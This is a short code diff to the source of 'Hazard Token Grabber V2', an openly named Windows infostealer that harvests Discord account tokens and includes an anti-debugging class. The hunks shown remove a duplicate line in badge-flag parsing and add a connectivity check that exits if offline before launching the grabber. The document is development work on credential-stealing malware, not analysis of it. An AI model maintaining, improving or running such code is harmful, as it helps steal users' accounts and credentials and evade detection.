@@ -851,7 +851,6 @@ class Hazard_Token_Grabber_V2(functions):
 
             badges = ""
             flags = j['flags']
-            flags = j['flags']
             if (flags == 1):
                 badges += "Staff, "
             if (flags == 2):
@@ -1127,5 +1126,9 @@ class AntiDebug(functions):
             winreg.CloseKey(handle)
 
 
-if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(Hazard_Token_Grabber_V2().init())
+if __name__ == "__main__" and os.name == "nt":	
+    try:	
+        httpx.get('https://google.com')	
+    except httpx.ConnectTimeout:	
+        os._exit(0)	
+    asyncio.run(HazardTokenGrabberV2().init())
